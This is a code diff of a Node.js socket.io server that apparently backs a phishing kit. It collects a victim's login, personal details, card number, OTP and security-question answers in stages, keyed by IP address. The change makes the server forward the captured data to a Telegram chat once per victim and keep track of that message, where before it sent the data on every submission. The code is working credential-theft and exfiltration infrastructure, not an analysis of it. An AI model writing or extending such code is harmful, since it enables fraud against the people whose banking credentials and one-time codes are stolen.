@@ -530,12 +530,13 @@ io.on('connection', (socket, req) => {
     socket.on('submit', (data) => {
         if (sessionStore.has(userIP)) {
         let userDetails = sessionStore.get(userIP);
-            if (!userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard && !userDetails.getUserDataOTP && !userDetails.getUserDataQuestion) {
+            if (!userDetails.getUserDataTelegramId && !userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard && !userDetails.getUserDataOTP && !userDetails.getUserDataQuestion) {
                 userDetails.getUserDataLogin = {};
                 userDetails.getUserDataDetails = {};
                 userDetails.getUserDataCard = {};
                 userDetails.getUserDataOTP = {};
                 userDetails.getUserDataQuestion = {};
+                userDetails.getUserDataTelegramId = {}
         }
         if(userDetails.stage == 'Login'){
             userDetails.getUserDataLogin = data
@@ -551,14 +552,20 @@ io.on('connection', (socket, req) => {
         } else if(userDetails.stage == 'OTP'){
             userDetails.getUserDataOTP = data
             
-        } 
+        }
+
+        if(userDetails.getUserDataTelegramId.msgId){
+            console.log('We got msg Id')
+            console.log(userDetails.getUserDataTelegramId.msgId);
+        } else {
+            console.log('New msg')
+            sendNewMessage(userDetails).then(messageId => {
+                userDetails.getUserDataTelegramId = {msgId: messageId, chatId: chatId}
+            })
+        }
             
         sessionStore.set(userIP, userDetails);
         io.emit('join', Array.from(sessionStore.entries())); // Emit the updated state
-
-        sendNewMessage(userDetails).then(messageId => {
-            console.log(messageId)
-        })
         
        
     }
